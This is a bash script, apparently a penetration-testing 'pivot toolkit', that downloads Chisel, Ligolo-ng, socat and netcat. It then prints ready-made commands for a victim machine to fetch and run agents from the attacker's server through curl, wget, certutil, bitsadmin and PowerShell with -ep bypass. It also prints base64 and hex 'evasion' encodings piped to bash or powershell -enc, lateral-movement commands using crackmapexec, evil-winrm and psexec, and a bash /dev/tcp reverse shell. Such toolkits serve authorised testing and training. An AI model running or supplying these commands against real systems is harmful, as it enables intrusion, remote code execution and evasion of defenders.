#!/bin/bash
#===============================================================================
# PIVOT SWISS ARMY KNIFE v4.0
# Ultimate pivoting toolkit for penetration testing
# 
# Features:
#   - Auto-download tools for multiple architectures
#   - One-liner generator with copy-paste ready commands
#   - Proxychains auto-configuration
#   - Connectivity testing
#   - Multiple encoding/obfuscation options
#   - Comprehensive transfer methods
#   - Multi-hop pivot support
#   - Session tracking
#
# Usage: 
#   curl -sL URL | bash
#   bash pivot.sh
#   bash pivot.sh --quick chisel      # Skip menu, direct tool
#   bash pivot.sh --serve-only        # Just serve existing files
#   bash pivot.sh --test-connection   # Test tunnel connectivity
#===============================================================================

set -o pipefail

VERSION="4.0"
WORK_DIR="${PIVOT_WORK_DIR:-/tmp/pivot_$$}"
SESSION_FILE="$HOME/.pivot_sessions"

# Tool versions (check GitHub for latest)
CHISEL_VER="${CHISEL_VER:-1.10.1}"
LIGOLO_VER="${LIGOLO_VER:-0.7.5}"

# Port ranges (safe ranges avoiding common services)
# Range: 10000-65000 avoids most well-known ports (0-1023) and registered ports (1024-49151)
PORT_RANGE_MIN=10000
PORT_RANGE_MAX=60000

# Ports will be randomly generated if not set via environment
HTTP_PORT="${HTTP_PORT:-}"
CHISEL_PORT="${CHISEL_PORT:-}"
LIGOLO_PORT="${LIGOLO_PORT:-}"
SOCKS_PORT="${SOCKS_PORT:-}"
CALLBACK_PORT="${CALLBACK_PORT:-}"

# Detect architecture
ARCH=$(uname -m)
case $ARCH in
    x86_64)  ARCH_SUFFIX="amd64" ;;
    aarch64) ARCH_SUFFIX="arm64" ;;
    armv7l)  ARCH_SUFFIX="armv7" ;;
    armv6l)  ARCH_SUFFIX="armv6" ;;
    i686)    ARCH_SUFFIX="386" ;;
    *)       ARCH_SUFFIX="amd64" ;;
esac

#===============================================================================
# LOGGING
#===============================================================================
log_info()  { echo "[+] $1"; }
log_warn()  { echo "[!] $1"; }
log_error() { echo "[-] $1"; }
log_debug() { [ "$DEBUG" = "1" ] && echo "[D] $1"; }
log_cmd()   { echo "    $1"; }
log_note()  { echo "    # $1"; }

section() {
    echo ""
    echo "============================================================"
    echo " $1"
    echo "============================================================"
}

subsection() {
    echo ""
    echo "--- $1 ---"
}

#===============================================================================
# CORE UTILITIES
#===============================================================================

# Input handling for both interactive and pipe mode
get_input() {
    local prompt="$1"
    local default="$2"
    local result=""
    
    if [ -t 0 ]; then
        read -r -p "$prompt" result
    elif [ -e /dev/tty ]; then
        read -r -p "$prompt" result < /dev/tty
    fi
    
    echo "${result:-$default}"
}

# Detect IP address with priority: tun0 > tap0 > eth > others
detect_ip() {
    local ip=""
    
    # Priority interfaces for pentest scenarios
    for iface in tun0 tun1 tap0 eth0 eth1 ens33 ens34 ens160 enp0s3 enp0s8 wlan0 wlan1; do
        ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        [ -n "$ip" ] && echo "$ip" && return 0
    done
    
    # Fallback: first global IP
    ip -4 addr show scope global 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1
}

# Generate random port in safe range
random_port() {
    local min="${1:-$PORT_RANGE_MIN}"
    local max="${2:-$PORT_RANGE_MAX}"
    local range=$((max - min))
    
    # Use /dev/urandom for better randomness if available
    if [ -r /dev/urandom ]; then
        local rand=$(od -An -tu4 -N4 /dev/urandom | tr -d ' ')
        echo $((min + (rand % range)))
    else
        echo $((min + (RANDOM * 32768 + RANDOM) % range))
    fi
}

# Check if port is available
port_available() {
    local port="$1"
    ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -qE ":${port}\b"
}

# Find available random port
find_port() {
    local min="${1:-$PORT_RANGE_MIN}"
    local max="${2:-$PORT_RANGE_MAX}"
    local attempts=50
    
    for _ in $(seq 1 $attempts); do
        local port=$(random_port "$min" "$max")
        if port_available "$port"; then
            echo "$port"
            return 0
        fi
    done
    
    # Fallback: sequential search in high range
    for port in $(seq 50000 60000); do
        if port_available "$port"; then
            echo "$port"
            return 0
        fi
    done
    
    # Last resort
    echo $(random_port 55000 65000)
}

# Generate all required ports (ensuring they don't conflict)
generate_ports() {
    local used_ports=""
    
    # HTTP port
    if [ -z "$HTTP_PORT" ]; then
        HTTP_PORT=$(find_port)
        used_ports="$HTTP_PORT"
    fi
    
    # Chisel port
    if [ -z "$CHISEL_PORT" ]; then
        while true; do
            CHISEL_PORT=$(find_port)
            [[ ! " $used_ports " =~ " $CHISEL_PORT " ]] && break
        done
        used_ports="$used_ports $CHISEL_PORT"
    fi
    
    # Ligolo port
    if [ -z "$LIGOLO_PORT" ]; then
        while true; do
            LIGOLO_PORT=$(find_port)
            [[ ! " $used_ports " =~ " $LIGOLO_PORT " ]] && break
        done
        used_ports="$used_ports $LIGOLO_PORT"
    fi
    
    # SOCKS port (keep in lower range for proxychains compatibility)
    if [ -z "$SOCKS_PORT" ]; then
        while true; do
            SOCKS_PORT=$(find_port 10800 10900)
            [[ ! " $used_ports " =~ " $SOCKS_PORT " ]] && break
        done
        used_ports="$used_ports $SOCKS_PORT"
    fi
    
    # Callback port
    if [ -z "$CALLBACK_PORT" ]; then
        while true; do
            CALLBACK_PORT=$(find_port)
            [[ ! " $used_ports " =~ " $CALLBACK_PORT " ]] && break
        done
    fi
}

# Download with multiple methods and retry
download() {
    local url="$1"
    local output="$2"
    local desc="${3:-file}"
    
    log_info "Downloading $desc..."
    
    for attempt in 1 2 3; do
        # curl (preferred)
        if command -v curl &>/dev/null; then
            if curl -fsSL --connect-timeout 30 --max-time 300 -o "$output" "$url" 2>/dev/null; then
                [ -s "$output" ] && log_info "$desc downloaded" && return 0
            fi
        fi
        
        # wget fallback
        if command -v wget &>/dev/null; then
            if wget -q --timeout=30 -O "$output" "$url" 2>/dev/null; then
                [ -s "$output" ] && log_info "$desc downloaded" && return 0
            fi
        fi
        
        log_warn "Attempt $attempt failed, retrying..."
        sleep 2
    done
    
    log_error "Failed to download $desc"
    return 1
}

# Extract compressed files
extract() {
    local input="$1"
    local output="$2"
    
    case "$input" in
        *.tar.gz|*.tgz)
            tar xzf "$input" 2>/dev/null
            local ret=$?
            [ $ret -ne 0 ] && log_error "Failed to extract $input"
            return $ret
            ;;
        *.gz)
            if [ -n "$output" ]; then
                if command -v gunzip &>/dev/null; then
                    gunzip -c "$input" > "$output" 2>/dev/null
                elif command -v gzip &>/dev/null; then
                    gzip -dc "$input" > "$output" 2>/dev/null
                elif command -v zcat &>/dev/null; then
                    zcat "$input" > "$output" 2>/dev/null
                else
                    log_error "No decompression tool available"
                    return 1
                fi
                [ -f "$output" ] && chmod +x "$output" 2>/dev/null
            fi
            ;;
        *.zip)
            if command -v unzip &>/dev/null; then
                unzip -qo "$input" 2>/dev/null
            else
                log_error "unzip not available"
                return 1
            fi
            ;;
        *)
            log_error "Unknown archive format: $input"
            return 1
            ;;
    esac
    
    return 0
}

# Copy to clipboard if available
to_clipboard() {
    local text="$1"
    
    if command -v xclip &>/dev/null; then
        echo -n "$text" | xclip -selection clipboard 2>/dev/null && return 0
    elif command -v xsel &>/dev/null; then
        echo -n "$text" | xsel --clipboard 2>/dev/null && return 0
    elif command -v pbcopy &>/dev/null; then
        echo -n "$text" | pbcopy 2>/dev/null && return 0
    fi
    return 1
}

# Install binary to PATH
install_local() {
    local src="$1"
    local name="$2"
    
    [ ! -f "$src" ] && return 1
    
    chmod +x "$src" 2>/dev/null
    
    if [ -w /usr/local/bin ]; then
        mv "$src" "/usr/local/bin/$name" && return 0
    fi
    
    mkdir -p "$HOME/.local/bin" 2>/dev/null
    mv "$src" "$HOME/.local/bin/$name"
    
    if [[ ":$PATH:" != *":$HOME/.local/bin:"* ]]; then
        export PATH="$HOME/.local/bin:$PATH"
        log_warn "Added ~/.local/bin to PATH. Add to .bashrc for persistence."
    fi
}

# Cleanup
cleanup() {
    [ "$KEEP_FILES" != "1" ] && rm -rf "$WORK_DIR" 2>/dev/null
}
trap cleanup EXIT

#===============================================================================
# PROXYCHAINS AUTO-CONFIGURATION
#===============================================================================

configure_proxychains() {
    local proxy_type="${1:-socks5}"
    local proxy_host="${2:-127.0.0.1}"
    local proxy_port="${3:-1080}"
    
    local conf_files=(
        "/etc/proxychains4.conf"
        "/etc/proxychains.conf"
        "$HOME/.proxychains/proxychains.conf"
    )
    
    section "PROXYCHAINS CONFIGURATION"
    
    echo ""
    echo "Add this line to your proxychains config:"
    echo ""
    log_cmd "$proxy_type $proxy_host $proxy_port"
    echo ""
    echo "Config file locations:"
    for conf in "${conf_files[@]}"; do
        if [ -f "$conf" ]; then
            echo "  [EXISTS] $conf"
        else
            echo "  [MISSING] $conf"
        fi
    done
    
    echo ""
    echo "Quick setup commands:"
    log_cmd "echo '$proxy_type $proxy_host $proxy_port' | sudo tee -a /etc/proxychains4.conf"
    log_cmd "# Or edit manually: sudo nano /etc/proxychains4.conf"
    
    echo ""
    echo "Recommended proxychains4.conf settings:"
    log_cmd "strict_chain"
    log_cmd "proxy_dns"
    log_cmd "remote_dns_subnet 224"
    log_cmd "tcp_read_time_out 15000"
    log_cmd "tcp_connect_time_out 8000"
    log_cmd "[ProxyList]"
    log_cmd "$proxy_type $proxy_host $proxy_port"
}

#===============================================================================
# CONNECTIVITY TESTING
#===============================================================================

test_socks_proxy() {
    local host="${1:-127.0.0.1}"
    local port="${2:-1080}"
    local target="${3:-}"
    
    section "TESTING SOCKS PROXY"
    
    echo ""
    log_info "Testing SOCKS proxy at $host:$port"
    
    # Check if port is open
    if command -v nc &>/dev/null; then
        if nc -z "$host" "$port" 2>/dev/null; then
            log_info "Port $port is OPEN"
        else
            log_error "Port $port is CLOSED"
            return 1
        fi
    fi
    
    # Test with curl if target provided
    if [ -n "$target" ]; then
        log_info "Testing connection to $target..."
        if command -v curl &>/dev/null; then
            if curl -s --socks5 "$host:$port" --connect-timeout 10 "$target" &>/dev/null; then
                log_info "Connection to $target: SUCCESS"
            else
                log_error "Connection to $target: FAILED"
            fi
        fi
    fi
    
    echo ""
    echo "Manual test commands:"
    log_cmd "proxychains curl http://<TARGET>"
    log_cmd "proxychains nmap -sT -Pn <TARGET>"
    log_cmd "curl --socks5 $host:$port http://<TARGET>"
}

test_tun_interface() {
    local iface="${1:-ligolo}"
    local target="${2:-}"
    
    section "TESTING TUN INTERFACE"
    
    echo ""
    
    # Check interface exists
    if ip link show "$iface" &>/dev/null; then
        log_info "Interface $iface EXISTS"
        ip addr show "$iface" 2>/dev/null | grep -E "inet|state" | sed 's/^/    /'
    else
        log_error "Interface $iface NOT FOUND"
        echo ""
        echo "Create with:"
        log_cmd "sudo ip tuntap add user \$(whoami) mode tun $iface"
        log_cmd "sudo ip link set $iface up"
        return 1
    fi
    
    # Check routes
    echo ""
    log_info "Routes through $iface:"
    ip route | grep "$iface" | sed 's/^/    /' || echo "    (none)"
    
    # Test connectivity
    if [ -n "$target" ]; then
        echo ""
        log_info "Testing connectivity to $target..."
        if ping -c 1 -W 3 "$target" &>/dev/null; then
            log_info "Ping to $target: SUCCESS"
        else
            log_warn "Ping to $target: FAILED (might be filtered)"
        fi
    fi
}

#===============================================================================
# ONE-LINER GENERATOR
#===============================================================================

generate_oneliners() {
    local tool="$1"
    local file="$2"
    local url="http://$IP:$HTTP_PORT/$file"
    
    subsection "COPY-PASTE ONE-LINERS"
    
    echo ""
    echo "LINUX (choose one):"
    echo ""
    
    # Standard methods
    local linux_curl="curl -so /tmp/$tool $url && chmod +x /tmp/$tool"
    local linux_wget="wget -qO /tmp/$tool $url && chmod +x /tmp/$tool"
    
    log_cmd "$linux_curl"
    log_cmd "$linux_wget"
    
    echo ""
    echo "LINUX (if curl/wget unavailable):"
    echo ""
    log_cmd "python3 -c \"import urllib.request;urllib.request.urlretrieve('$url','/tmp/$tool')\" && chmod +x /tmp/$tool"
    log_cmd "python -c \"import urllib;urllib.urlretrieve('$url','/tmp/$tool')\" && chmod +x /tmp/$tool"
    log_cmd "perl -e 'use LWP::Simple;getstore(\"$url\",\"/tmp/$tool\");chmod 0755,\"/tmp/$tool\"'"
    log_cmd "php -r \"file_put_contents('/tmp/$tool',file_get_contents('$url'));chmod('/tmp/$tool',0755);\""
    
    echo ""
    echo "WINDOWS CMD:"
    echo ""
    log_cmd "certutil -urlcache -f $url %TEMP%\\$tool"
    
    echo ""
    echo "WINDOWS POWERSHELL:"
    echo ""
    log_cmd "iwr -uri $url -outfile \$env:TEMP\\$tool"
    log_cmd "(New-Object Net.WebClient).DownloadFile('$url',\"\$env:TEMP\\$tool\")"
    log_cmd "Start-BitsTransfer -Source $url -Destination \$env:TEMP\\$tool"
}

generate_encoded_command() {
    local cmd="$1"
    
    subsection "ENCODED COMMANDS (for evasion)"
    
    echo ""
    echo "Base64 (Linux):"
    local b64_linux=$(echo -n "$cmd" | base64 -w0 2>/dev/null || echo -n "$cmd" | base64 2>/dev/null)
    log_cmd "echo $b64_linux | base64 -d | bash"
    
    echo ""
    echo "Base64 (PowerShell):"
    local b64_ps=$(echo -n "$cmd" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo "(encoding not available)")
    if [ "$b64_ps" != "(encoding not available)" ]; then
        log_cmd "powershell -enc $b64_ps"
    else
        log_cmd "# Base64 encoding requires iconv"
    fi
    
    echo ""
    echo "Hex encoded (Linux):"
    local hex=$(echo -n "$cmd" | xxd -p 2>/dev/null | tr -d '\n')
    if [ -n "$hex" ]; then
        log_cmd "echo $hex | xxd -r -p | bash"
    fi
}

#===============================================================================
# FILE TRANSFER - ALL METHODS
#===============================================================================

show_all_transfer_methods() {
    local file="$1"
    local url="http://$IP:$HTTP_PORT/$file"
    
    section "FILE TRANSFER METHODS: $file"
    
    subsection "LINUX - HTTP Downloads"
    echo ""
    log_cmd "# curl"
    log_cmd "curl -o /tmp/$file $url"
    log_cmd "curl -o /tmp/$file $url && chmod +x /tmp/$file"
    echo ""
    log_cmd "# wget"
    log_cmd "wget -O /tmp/$file $url"
    log_cmd "wget -O /tmp/$file $url && chmod +x /tmp/$file"
    echo ""
    log_cmd "# Python 3"
    log_cmd "python3 -c \"import urllib.request; urllib.request.urlretrieve('$url', '/tmp/$file')\""
    echo ""
    log_cmd "# Python 2"
    log_cmd "python -c \"import urllib; urllib.urlretrieve('$url', '/tmp/$file')\""
    echo ""
    log_cmd "# Perl"
    log_cmd "perl -e 'use LWP::Simple; getstore(\"$url\", \"/tmp/$file\")'"
    echo ""
    log_cmd "# PHP"
    log_cmd "php -r \"file_put_contents('/tmp/$file', file_get_contents('$url'));\""
    echo ""
    log_cmd "# Ruby"
    log_cmd "ruby -e \"require 'open-uri'; File.write('/tmp/$file', URI.open('$url').read)\""
    
    subsection "LINUX - Alternative Methods"
    echo ""
    log_cmd "# Netcat (run on attacker: nc -lvnp $HTTP_PORT < $file)"
    log_cmd "nc $IP $HTTP_PORT > /tmp/$file"
    echo ""
    log_cmd "# Bash /dev/tcp"
    log_cmd "cat < /dev/tcp/$IP/$HTTP_PORT > /tmp/$file"
    echo ""
    log_cmd "# SCP (if you have creds)"
    log_cmd "scp user@$IP:/path/$file /tmp/$file"
    echo ""
    log_cmd "# Base64 (copy-paste through limited shell)"
    log_cmd "# On attacker: base64 -w0 $file"
    log_cmd "echo 'BASE64_STRING' | base64 -d > /tmp/$file && chmod +x /tmp/$file"
    
    subsection "WINDOWS - Standard Methods"
    echo ""
    log_cmd "# certutil (most reliable)"
    log_cmd "certutil -urlcache -f $url %TEMP%\\$file"
    echo ""
    log_cmd "# PowerShell Invoke-WebRequest"
    log_cmd "powershell -c \"iwr -uri $url -outfile \$env:TEMP\\$file\""
    log_cmd "powershell -ep bypass -c \"iwr $url -o \$env:TEMP\\$file\""
    echo ""
    log_cmd "# PowerShell WebClient"
    log_cmd "powershell -c \"(New-Object Net.WebClient).DownloadFile('$url','\$env:TEMP\\$file')\""
    echo ""
    log_cmd "# PowerShell Start-BitsTransfer"
    log_cmd "powershell -c \"Start-BitsTransfer -Source $url -Destination \$env:TEMP\\$file\""
    echo ""
    log_cmd "# bitsadmin"
    log_cmd "bitsadmin /transfer j /download /priority high $url %TEMP%\\$file"
    echo ""
    log_cmd "# curl (Windows 10+)"
    log_cmd "curl -o %TEMP%\\$file $url"
    
    subsection "WINDOWS - Alternate Methods"
    echo ""
    log_cmd "# PowerShell Base64"
    log_cmd "# On attacker: base64 -w0 $file"
    log_cmd "powershell -c \"\$b='BASE64';[IO.File]::WriteAllBytes('\$env:TEMP\\$file',[Convert]::FromBase64String(\$b))\""
    echo ""
    log_cmd "# SMB (host share on attacker: impacket-smbserver share .)"
    log_cmd "copy \\\\$IP\\share\\$file %TEMP%\\$file"
}

#===============================================================================
# TOOL DOWNLOADS
#===============================================================================

download_chisel() {
    local base_url="https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}"
    
    # Linux agent
    log_info "Downloading Chisel Linux ($ARCH_SUFFIX)..."
    if download "$base_url/chisel_${CHISEL_VER}_linux_${ARCH_SUFFIX}.gz" "chisel_linux.gz" "Chisel Linux"; then
        if command -v gunzip &>/dev/null; then
            gunzip -f chisel_linux.gz 2>/dev/null
        elif command -v gzip &>/dev/null; then
            gzip -df chisel_linux.gz 2>/dev/null
        fi
        
        if [ -f "chisel_linux" ]; then
            chmod +x chisel_linux
            log_info "chisel_linux ready ($(ls -lh chisel_linux 2>/dev/null | awk '{print $5}'))"
        else
            log_error "Failed to extract chisel_linux"
        fi
        rm -f chisel_linux.gz 2>/dev/null
    else
        log_error "Failed to download Chisel Linux"
    fi
    
    # Windows agent
    log_info "Downloading Chisel Windows..."
    if download "$base_url/chisel_${CHISEL_VER}_windows_amd64.gz" "chisel.exe.gz" "Chisel Windows"; then
        if command -v gunzip &>/dev/null; then
            gunzip -f chisel.exe.gz 2>/dev/null
        elif command -v gzip &>/dev/null; then
            gzip -df chisel.exe.gz 2>/dev/null
        fi
        
        if [ -f "chisel.exe" ]; then
            log_info "chisel.exe ready ($(ls -lh chisel.exe 2>/dev/null | awk '{print $5}'))"
        else
            log_error "Failed to extract chisel.exe"
        fi
        rm -f chisel.exe.gz 2>/dev/null
    else
        log_error "Failed to download Chisel Windows"
    fi
    
    # Verify files
    echo ""
    log_info "Verifying files:"
    [ -f "chisel_linux" ] && log_info "  chisel_linux: OK" || log_error "  chisel_linux: MISSING"
    [ -f "chisel.exe" ] && log_info "  chisel.exe: OK" || log_error "  chisel.exe: MISSING"
    
    # Install server locally
    if ! command -v chisel &>/dev/null; then
        log_info "Installing Chisel server locally..."
        if [ -f "chisel_linux" ]; then
            cp chisel_linux /tmp/chisel_srv
            install_local "/tmp/chisel_srv" "chisel"
            log_info "Chisel server installed"
        fi
    else
        log_info "Chisel already installed: $(which chisel)"
    fi
}

download_ligolo() {
    local base_url="https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}"
    
    # Linux agent
    log_info "Downloading Ligolo agent Linux ($ARCH_SUFFIX)..."
    if download "$base_url/ligolo-ng_agent_${LIGOLO_VER}_linux_${ARCH_SUFFIX}.tar.gz" "ligolo_agent.tar.gz" "Ligolo agent Linux"; then
        tar xzf ligolo_agent.tar.gz 2>/dev/null
        if [ -f "agent" ]; then
            mv agent ligolo_linux
            chmod +x ligolo_linux
            rm -f ligolo_agent.tar.gz LICENSE README.md 2>/dev/null
            log_info "ligolo_linux ready ($(ls -lh ligolo_linux 2>/dev/null | awk '{print $5}'))"
        else
            log_error "Extraction failed - 'agent' binary not found"
            # Try to list what was extracted
            log_warn "Contents: $(ls -la 2>/dev/null | head -5)"
        fi
    else
        log_error "Failed to download Ligolo Linux agent"
    fi
    
    # Windows agent
    log_info "Downloading Ligolo agent Windows..."
    if download "$base_url/ligolo-ng_agent_${LIGOLO_VER}_windows_amd64.zip" "ligolo_agent.zip" "Ligolo agent Windows"; then
        unzip -qo ligolo_agent.zip 2>/dev/null
        if [ -f "agent.exe" ]; then
            mv agent.exe ligolo.exe
            rm -f ligolo_agent.zip LICENSE README.md 2>/dev/null
            log_info "ligolo.exe ready ($(ls -lh ligolo.exe 2>/dev/null | awk '{print $5}'))"
        else
            log_error "Extraction failed - 'agent.exe' not found"
        fi
    else
        log_error "Failed to download Ligolo Windows agent"
    fi
    
    # Verify files exist
    echo ""
    log_info "Verifying files:"
    [ -f "ligolo_linux" ] && log_info "  ligolo_linux: OK" || log_error "  ligolo_linux: MISSING"
    [ -f "ligolo.exe" ] && log_info "  ligolo.exe: OK" || log_error "  ligolo.exe: MISSING"
    
    # Install proxy locally
    if ! command -v ligolo-ng &>/dev/null && ! command -v ligolo-proxy &>/dev/null; then
        log_info "Installing Ligolo-ng proxy locally..."
        if download "$base_url/ligolo-ng_proxy_${LIGOLO_VER}_linux_${ARCH_SUFFIX}.tar.gz" "/tmp/ligolo_proxy.tar.gz" "Ligolo proxy"; then
            tar xzf /tmp/ligolo_proxy.tar.gz -C /tmp 2>/dev/null
            if [ -f "/tmp/proxy" ]; then
                install_local "/tmp/proxy" "ligolo-ng"
                log_info "Ligolo-ng proxy installed"
            fi
            rm -f /tmp/ligolo_proxy.tar.gz /tmp/LICENSE /tmp/README.md 2>/dev/null
        fi
    else
        log_info "Ligolo-ng proxy already installed: $(which ligolo-ng 2>/dev/null || which ligolo-proxy 2>/dev/null)"
    fi
}

download_socat() {
    log_info "Downloading Socat..."
    if download "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" "socat_linux" "Socat"; then
        chmod +x socat_linux 2>/dev/null
        if [ -f "socat_linux" ] && [ -x "socat_linux" ]; then
            log_info "socat_linux ready ($(ls -lh socat_linux 2>/dev/null | awk '{print $5}'))"
        else
            log_error "socat_linux not executable"
        fi
    else
        log_error "Failed to download Socat"
    fi
}

download_netcat() {
    log_info "Downloading Netcat..."
    if download "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" "nc_linux" "Netcat"; then
        chmod +x nc_linux 2>/dev/null
        if [ -f "nc_linux" ] && [ -x "nc_linux" ]; then
            log_info "nc_linux ready ($(ls -lh nc_linux 2>/dev/null | awk '{print $5}'))"
        else
            log_error "nc_linux not executable"
        fi
    else
        log_error "Failed to download Netcat"
    fi
}

download_plink() {
    log_info "Downloading Plink..."
    if download "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" "plink.exe" "Plink"; then
        if [ -f "plink.exe" ]; then
            log_info "plink.exe ready ($(ls -lh plink.exe 2>/dev/null | awk '{print $5}'))"
        else
            log_error "plink.exe missing"
        fi
    else
        log_error "Failed to download Plink"
    fi
}

#===============================================================================
# CHISEL - COMPLETE GUIDE
#===============================================================================

show_chisel() {
    section "CHISEL SETUP"
    
    local files_ready=""
    [ -f "chisel_linux" ] && files_ready="$files_ready chisel_linux"
    [ -f "chisel.exe" ] && files_ready="$files_ready chisel.exe"
    
    if [ -n "$files_ready" ]; then
        echo ""
        echo "Files ready:$files_ready"
    fi
    
    section "CHISEL - REVERSE SOCKS PROXY"
    
    echo ""
    echo "This creates a SOCKS5 proxy on YOUR machine (127.0.0.1:$SOCKS_PORT)"
    echo "Use with proxychains to access internal networks."
    echo ""
    
    echo "STEP 1: START CHISEL SERVER (on your attack machine)"
    echo ""
    log_cmd "chisel server -p $CHISEL_PORT --reverse"
    log_note "Keep this running in a terminal"
    
    echo ""
    echo "STEP 2: RUN CHISEL CLIENT (on victim/pivot)"
    echo ""
    echo "Linux:"
    log_cmd "curl -so /tmp/c http://$IP:$HTTP_PORT/chisel_linux && chmod +x /tmp/c && /tmp/c client $IP:$CHISEL_PORT R:socks"
    log_cmd "wget -qO /tmp/c http://$IP:$HTTP_PORT/chisel_linux && chmod +x /tmp/c && /tmp/c client $IP:$CHISEL_PORT R:socks"
    echo ""
    echo "Windows:"
    log_cmd "certutil -urlcache -f http://$IP:$HTTP_PORT/chisel.exe %TEMP%\\c.exe && %TEMP%\\c.exe client $IP:$CHISEL_PORT R:socks"
    log_cmd "powershell -ep bypass -c \"iwr http://$IP:$HTTP_PORT/chisel.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe client $IP:$CHISEL_PORT R:socks\""
    
    echo ""
    echo "STEP 3: USE PROXYCHAINS (on your attack machine)"
    echo ""
    log_cmd "# Ensure /etc/proxychains4.conf has: socks5 127.0.0.1 $SOCKS_PORT"
    log_cmd "proxychains nmap -sT -Pn <INTERNAL_TARGET>"
    log_cmd "proxychains curl http://<INTERNAL_TARGET>"
    log_cmd "proxychains ssh user@<INTERNAL_TARGET>"
    log_cmd "proxychains crackmapexec smb <INTERNAL_SUBNET>/24"
    log_cmd "proxychains evil-winrm -i <INTERNAL_TARGET> -u user -p pass"
    
    section "CHISEL - SPECIFIC PORT FORWARD"
    
    echo ""
    echo "Forward a specific port instead of full SOCKS proxy."
    echo ""
    echo "STEP 1: Start server (same as above)"
    log_cmd "chisel server -p $CHISEL_PORT --reverse"
    echo ""
    echo "STEP 2: Client with port forward"
    log_cmd "# Forward RDP"
    log_cmd "./c client $IP:$CHISEL_PORT R:3389:<INTERNAL_TARGET>:3389"
    echo ""
    log_cmd "# Forward multiple ports"
    log_cmd "./c client $IP:$CHISEL_PORT R:3389:<T1>:3389 R:445:<T2>:445 R:22:<T3>:22"
    echo ""
    echo "STEP 3: Connect directly (no proxychains needed)"
    log_cmd "xfreerdp /v:127.0.0.1:3389 /u:user /p:pass"
    log_cmd "smbclient -L //127.0.0.1 -p 445 -U user"
    
    section "CHISEL - FORWARD SOCKS (Alternative)"
    
    echo ""
    echo "Server on victim, client on attacker. Use when victim can't reach you."
    echo ""
    echo "Victim (start server):"
    log_cmd "./c server -p 8000 --socks5"
    echo ""
    echo "Attacker (connect):"
    log_cmd "chisel client <VICTIM_IP>:8000 socks"
    
    configure_proxychains "socks5" "127.0.0.1" "$SOCKS_PORT"
    
    show_all_transfer_methods "chisel_linux"
}

#===============================================================================
# LIGOLO-NG - COMPLETE GUIDE
#===============================================================================

show_ligolo() {
    section "LIGOLO-NG SETUP"
    
    local files_ready=""
    [ -f "ligolo_linux" ] && files_ready="$files_ready ligolo_linux"
    [ -f "ligolo.exe" ] && files_ready="$files_ready ligolo.exe"
    
    if [ -n "$files_ready" ]; then
        echo ""
        echo "Files ready:$files_ready"
    fi
    
    section "LIGOLO-NG - TUN INTERFACE (Direct Access, No Proxychains!)"
    
    echo ""
    echo "Ligolo creates a virtual network interface on YOUR machine."
    echo "You can then access the internal network DIRECTLY - no proxychains needed!"
    echo ""
    
    echo "STEP 1: CREATE TUN INTERFACE (on your attack machine, one-time setup)"
    echo ""
    log_cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo"
    log_cmd "sudo ip link set ligolo up"
    log_note "Only needed once. Persists until reboot."
    
    echo ""
    echo "STEP 2: START LIGOLO PROXY (on your attack machine)"
    echo ""
    log_cmd "ligolo-ng -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
    log_note "Keep this running. Agents will connect here."
    
    echo ""
    echo "STEP 3: RUN LIGOLO AGENT (on victim/pivot)"
    echo ""
    echo "Linux:"
    log_cmd "curl -so /tmp/a http://$IP:$HTTP_PORT/ligolo_linux && chmod +x /tmp/a && /tmp/a -connect $IP:$LIGOLO_PORT -ignore-cert"
    log_cmd "wget -qO /tmp/a http://$IP:$HTTP_PORT/ligolo_linux && chmod +x /tmp/a && /tmp/a -connect $IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo "Windows:"
    log_cmd "certutil -urlcache -f http://$IP:$HTTP_PORT/ligolo.exe %TEMP%\\a.exe && %TEMP%\\a.exe -connect $IP:$LIGOLO_PORT -ignore-cert"
    log_cmd "powershell -ep bypass -c \"iwr http://$IP:$HTTP_PORT/ligolo.exe -o \$env:TEMP\\a.exe; & \$env:TEMP\\a.exe -connect $IP:$LIGOLO_PORT -ignore-cert\""
    
    echo ""
    echo "STEP 4: IN LIGOLO CONSOLE - SELECT SESSION"
    echo ""
    log_cmd "ligolo-ng >> session"
    log_note "Shows connected agents. Press Enter or type number to select."
    log_cmd "ligolo-ng >> ifconfig"
    log_note "Shows victim's network interfaces. Note the internal subnet!"
    log_note "Example: 172.16.5.0/24, 10.10.10.0/24"
    
    echo ""
    echo "STEP 5: ADD ROUTE (on your attack machine, NEW terminal)"
    echo ""
    log_cmd "sudo ip route add 172.16.5.0/24 dev ligolo"
    log_note "Replace 172.16.5.0/24 with actual internal subnet from ifconfig"
    log_note "Add multiple routes if victim has multiple internal networks:"
    log_cmd "sudo ip route add 10.10.10.0/24 dev ligolo"
    
    echo ""
    echo "STEP 6: START TUNNEL (back in ligolo console)"
    echo ""
    log_cmd "ligolo-ng >> start"
    log_note "Tunnel is now active!"
    
    echo ""
    echo "STEP 7: ACCESS INTERNAL NETWORK DIRECTLY!"
    echo ""
    log_cmd "nmap -sT -Pn 172.16.5.19"
    log_cmd "curl http://172.16.5.19"
    log_cmd "ssh user@172.16.5.19"
    log_cmd "xfreerdp /v:172.16.5.19 /u:user /p:pass"
    log_cmd "crackmapexec smb 172.16.5.0/24"
    log_cmd "evil-winrm -i 172.16.5.19 -u user -p pass"
    log_cmd "impacket-psexec user:pass@172.16.5.19"
    log_note "No proxychains needed!"
    
    section "LIGOLO - REVERSE PORT FORWARD (Catch shells from internal hosts)"
    
    echo ""
    echo "Make your listener accessible to internal hosts through the pivot."
    echo ""
    echo "In ligolo console:"
    log_cmd "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444"
    log_note "Internal hosts connecting to PIVOT_INTERNAL_IP:4444 reach YOUR :4444"
    echo ""
    echo "On your machine:"
    log_cmd "nc -lvnp 4444"
    echo ""
    echo "Payload on internal host (connects to pivot's internal IP):"
    log_cmd "bash -i >& /dev/tcp/172.16.5.X/4444 0>&1"
